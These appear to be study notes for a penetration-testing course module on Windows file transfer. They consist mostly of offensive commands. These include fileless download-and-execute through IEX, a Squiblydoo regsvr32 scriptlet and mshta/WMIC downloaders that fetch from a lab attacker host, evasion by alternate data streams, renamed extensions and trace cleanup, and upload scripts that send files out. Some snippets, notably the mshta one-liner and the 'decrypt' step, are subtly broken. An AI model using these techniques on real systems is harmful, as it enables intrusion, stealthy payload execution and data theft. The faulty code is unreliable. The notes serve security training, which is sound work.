---
tags: [module/file-transfers, windows, powershell, smb, ftp, webdav, bitsadmin, certutil, evasion, level/advanced, practical]
---

# Windows File Transfer Methods - Practical Application

## Complete Windows File Transfer Workflow

Phase 1: Reconnaissance (What's Available?)
Phase 2: PowerShell Deep Dive
Phase 3: Certutil & Bitsadmin
Phase 4: SMB & WebDAV
Phase 5: FTP
Phase 6: Living Off the Land Binaries
Phase 7: Evasion Techniques
Phase 8: Automation

---

## Phase 1: Reconnaissance - What's Available?

### Check Installed Tools

# PowerShell version
$PSVersionTable.PSVersion

# Check if certutil exists
Get-Command certutil -ErrorAction SilentlyContinue

# Check if bitsadmin exists
Get-Command bitsadmin -ErrorAction SilentlyContinue

# Check if curl exists
Get-Command curl -ErrorAction SilentlyContinue

# Check if wget exists
Get-Command wget -ErrorAction SilentlyContinue

### Test Outbound Connectivity

# Test HTTP
Test-NetConnection -ComputerName YOUR-IP -Port 80

# Test HTTPS
Test-NetConnection -ComputerName YOUR-IP -Port 443

# Test SMB
Test-NetConnection -ComputerName YOUR-IP -Port 445

# Test FTP
Test-NetConnection -ComputerName YOUR-IP -Port 21

---

## Phase 2: PowerShell Deep Dive

### WebClient Methods Reference

| Method | Description |
|--------|-------------|
| DownloadFile | Downloads to disk |
| DownloadString | Downloads as string (memory) |
| DownloadData | Downloads as byte array |
| OpenRead | Returns stream |
| UploadFile | Uploads file |
| UploadString | Uploads string |
| UploadData | Uploads byte array |

### DownloadFile Variations

# Basic
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe', 'C:\temp\file.exe')

# With proxy
$wc = New-Object System.Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$wc.DownloadFile('http://10.10.14.5/file.exe', 'C:\temp\file.exe')

# With credentials
$wc = New-Object System.Net.WebClient
$wc.Credentials = New-Object System.Net.NetworkCredential('user', 'pass')
$wc.DownloadFile('http://internal.site/file.exe', 'C:\temp\file.exe')

### DownloadString - Fileless Execution

# Basic
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')

# Pipeline
(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1') | IEX

# Multiple downloads
$scripts = @('script1.ps1', 'script2.ps1')
$scripts | ForEach-Object {
    IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.5/$_")
}

### Invoke-WebRequest (iwr)

# Basic download
iwr -uri http://10.10.14.5/file.exe -OutFile file.exe

# With headers
iwr -uri http://10.10.14.5/file.exe -Headers @{'User-Agent' = 'Mozilla/5.0'} -OutFile file.exe

# POST request
$body = @{data = 'test'}
iwr -uri http://10.10.14.5/upload -Method POST -Body $body

### Start-BitsTransfer (PowerShell 3.0+)

# Basic
Start-BitsTransfer -Source http://10.10.14.5/file.exe -Destination C:\temp\file.exe

# With priority
Start-BitsTransfer -Source http://10.10.14.5/file.exe -Destination C:\temp\file.exe -Priority High

# Asynchronous
$job = Start-BitsTransfer -Source http://10.10.14.5/file.exe -Destination C:\temp\file.exe -Asynchronous
$job | Complete-BitsTransfer

### Background Intelligent Transfer Service (BITS) Admin

bitsadmin /transfer myjob /download /priority high http://10.10.14.5/file.exe C:\temp\file.exe

# Monitor
bitsadmin /list
bitsadmin /info myjob

---

## Phase 3: Certutil & Bitsadmin

### Certutil Download

# Basic
certutil -urlcache -f http://10.10.14.5/file.exe file.exe

# Split large files
certutil -split -f http://10.10.14.5/largefile.bin largefile.bin

# Verify hash after download
certutil -hashfile file.exe MD5
certutil -hashfile file.exe SHA256

# Delete cache (clean traces)
certutil -urlcache -f http://10.10.14.5/file.exe delete

### Bitsadmin Deep Dive

# Create job
bitsadmin /create mydownload

# Add file
bitsadmin /addfile mydownload http://10.10.14.5/file.exe C:\temp\file.exe

# Set priority
bitsadmin /setpriority mydownload high

# Start
bitsadmin /resume mydownload

# Monitor
bitsadmin /info mydownload /verbose

# Complete
bitsadmin /complete mydownload

# List all jobs
bitsadmin /list

# Cancel job
bitsadmin /cancel mydownload

---

## Phase 4: SMB & WebDAV

### Impacket smbserver Advanced

# Basic share
sudo impacket-smbserver share -smb2support /tmp/smbshare

# With authentication
sudo impacket-smbserver share -smb2support /tmp/smbshare -user htb -password "HTB_@cademy_student!"

# With specific interface
sudo impacket-smbserver share -smb2support /tmp/smbshare -ip 10.10.14.5

### Mount SMB Share (Windows)

# Map drive
net use Z: \\10.10.14.5\share /persistent:yes

# With credentials
net use Z: \\10.10.14.5\share /user:htb "HTB_@cademy_student!"

# List connections
net use

# Remove
net use Z: /delete

### PowerShell Copy-Item with SMB

Copy-Item -Path "\\10.10.14.5\share\file.exe" -Destination "C:\temp\file.exe"

### WebDAV Setup

# Install WebDAV modules
sudo pip3 install wsgidav cheroot

# Start WebDAV server
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

### Access WebDAV from Windows

# Using net use (will fall back to HTTP if SMB fails)
net use Z: \\10.10.14.5\DavWWWRoot

# Copy files
copy \\10.10.14.5\DavWWWRoot\file.exe C:\temp\

# Using dir to list
dir \\10.10.14.5\DavWWWRoot

Note: DavWWWRoot is a special keyword that tells Windows to use WebDAV instead of SMB.

---

## Phase 5: FTP

### Advanced FTP Server Setup

# Install pyftpdlib
sudo pip3 install pyftpdlib

# Start with write permissions
sudo python3 -m pyftpdlib --port 21 --write

# With specific directory
sudo python3 -m pyftpdlib --port 21 --write --directory=/srv/ftp

# With authentication
sudo python3 -m pyftpdlib --port 21 --write --user=htb --password=pass

### PowerShell FTP Upload

# Basic upload
(New-Object Net.WebClient).UploadFile('ftp://10.10.14.5/file.txt', 'C:\file.txt')

# With credentials
$wc = New-Object Net.WebClient
$wc.Credentials = New-Object System.Net.NetworkCredential('htb', 'pass')
$wc.UploadFile('ftp://10.10.14.5/file.txt', 'C:\file.txt')

### PowerShell FTP Download

$wc = New-Object Net.WebClient
$wc.DownloadFile('ftp://10.10.14.5/file.exe', 'C:\temp\file.exe')

### Advanced FTP Client Scripting

# Create command file
@"
open 10.10.14.5
user anonymous
binary
lcd C:\temp
get file1.exe
get file2.dll
put results.txt
bye
"@ | Out-File -FilePath ftp.txt -Encoding ASCII

# Run
ftp -v -n -s:ftp.txt

### FTP Over HTTP Proxy

# Using curl (if available)
curl -x http://proxy:8080 -T file.txt ftp://10.10.14.5/

---

## Phase 6: Living Off the Land Binaries

### Windows Built-in Tools

| Tool | Use | Download | Upload |
|------|-----|----------|--------|
| certutil | Download | ✅ | ❌ |
| bitsadmin | Download | ✅ | ❌ |
| powershell | Both | ✅ | ✅ |
| cscript | Script host | ✅ | ❌ |
| wmic | Download via XSL | ✅ | ❌ |
| mshta | HTML apps | ✅ | ❌ |
| regsvr32 | COM registration | ✅ | ❌ |

### WMIC XSL Download

# Create XSL file
<?xml version="1.0"?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" version="1.0">
<output method="text"/>
<template match="/">
<script>
<![CDATA[
var xmlhttp = new ActiveXObject("MSXML2.ServerXMLHTTP");
xmlhttp.open("GET", "http://10.10.14.5/file.exe", false);
xmlhttp.send();
var stream = new ActiveXObject("ADODB.Stream");
stream.Open();
stream.Type = 1;
stream.Write(xmlhttp.responseBody);
stream.SaveToFile("C:\\temp\\file.exe", 2);
stream.Close();
]]>
</script>
</template>
</stylesheet>

# Execute
wmic os get /format:"file.xsl"

### MSHTA Download

mshta javascript:"var f=new ActiveXObject('ADODB.Stream');f.Open();f.Type=1;f.Write(new ActiveXObject('MSXML2.ServerXMLHTTP').open('GET','http://10.10.14.5/file.exe',false);f.SaveToFile('file.exe',2);f.Close();close();"

### Regsvr32 (Squiblydoo)

# Create SCT file
<?XML version="1.0"?>
<scriptlet>
<registration progid="Test" classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')");
]]>
</script>
</registration>
</scriptlet>

# Execute
regsvr32 /s /n /u /i:http://10.10.14.5/file.sct scrobj.dll

---

## Phase 7: Evasion Techniques

### Split Large Files

# Split into chunks (Linux)
split -b 10M largefile.exe part_

# Transfer chunks individually
# Reassemble on Windows
copy /b part_* largefile.exe

### Encrypt/Decrypt

# Encrypt with OpenSSL
openssl enc -aes-256-cbc -in file.exe -out file.enc -pass pass:secret

# Decrypt on Windows (PowerShell)
$enc = Get-Content -Path file.enc -Raw
$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))
[IO.File]::WriteAllBytes("file.exe", [System.Convert]::FromBase64String($dec))

### Alternate Data Streams (ADS)

# Hide file in stream
type file.exe > legit.txt:file.exe

# Execute from stream
wmic process call create "C:\temp\legit.txt:file.exe"

# List streams
dir /r

### Change Extensions

# Rename before transfer
rename file.exe file.jpg

# Transfer
# Rename back
rename file.jpg file.exe

### Use Non-Standard Ports

# Start server on port 8080
python3 -m http.server 8080

# Download from non-standard port
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8080/file.exe', 'file.exe')

---

## Phase 8: Automation

### Complete Windows Download Script

Save as windows-download.ps1:

param(
    [string]$url,
    [string]$output,
    [string]$method = "auto"
)

$methods = @{
    "webclient" = { (New-Object Net.WebClient).DownloadFile($url, $output) }
    "iwr" = { Invoke-WebRequest -Uri $url -OutFile $output }
    "bits" = { Start-BitsTransfer -Source $url -Destination $output }
    "certutil" = { & certutil -urlcache -f $url $output }
}

if ($method -eq "auto") {
    $methods.Keys | ForEach-Object {
        try {
            Write-Host "[*] Trying $_..."
            & $methods[$_]
            Write-Host "[+] Success with $_"
            return
        } catch {
            Write-Host "[-] $_ failed"
        }
    }
} else {
    & $methods[$method]
}

# Usage
.\windows-download.ps1 -url "http://10.10.14.5/file.exe" -output "C:\temp\file.exe"

### Automated Upload Script

Save as windows-upload.ps1:

param(
    [string]$file,
    [string]$server,
    [string]$method = "ftp"
)

switch ($method) {
    "ftp" {
        $wc = New-Object Net.WebClient
        $wc.UploadFile("ftp://$server/$(Split-Path $file -Leaf)", $file)
    }
    "web" {
        $body = @{file = [System.IO.File]::ReadAllText($file)}
        Invoke-WebRequest -Uri "http://$server/upload" -Method POST -Body $body
    }
    "base64" {
        $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($file))
        Write-Host $b64
        Write-Host "[*] Copy base64 string to Linux and decode"
    }
}

---

## Windows File Transfer Cheatsheet

| Operation | Command |
|-----------|---------|
| PowerShell download | (New-Object Net.WebClient).DownloadFile('url', 'file') |
| PowerShell fileless | IEX (New-Object Net.WebClient).DownloadString('url') |
| Invoke-WebRequest | iwr -uri url -OutFile file |
| Certutil | certutil -urlcache -f url file |
| Bitsadmin | bitsadmin /transfer job /download /priority high url file |
| SMB copy | copy \\server\share\file . |
| FTP download | (New-Object Net.WebClient).DownloadFile('ftp://server/file', 'file') |
| FTP upload | (New-Object Net.WebClient).UploadFile('ftp://server/file', 'file') |
| Base64 encode | [Convert]::ToBase64String([IO.File]::ReadAllBytes('file')) |
| Base64 decode | [IO.File]::WriteAllBytes('file', [Convert]::FromBase64String('string')) |

---

## Key Takeaways

- Always test multiple methods - one WILL fail
- PowerShell is the Swiss Army knife of Windows file transfers
- Certutil and Bitsadmin are great alternatives when PowerShell is blocked
- SMB works well but may be blocked outbound
- WebDAV is SMB over HTTP - bypasses SMB blocks
- FTP is simple but often filtered
- Base64 works when binary transfers are impossible
- Living off the land binaries (LOLBins) evade detection
- Split large files to bypass size limits
- Use alternate data streams to hide files
- Automate your downloads with scripts
- The Astaroth attack shows real-world chaining
- Practice ALL methods in the lab
- Document what works for each environment
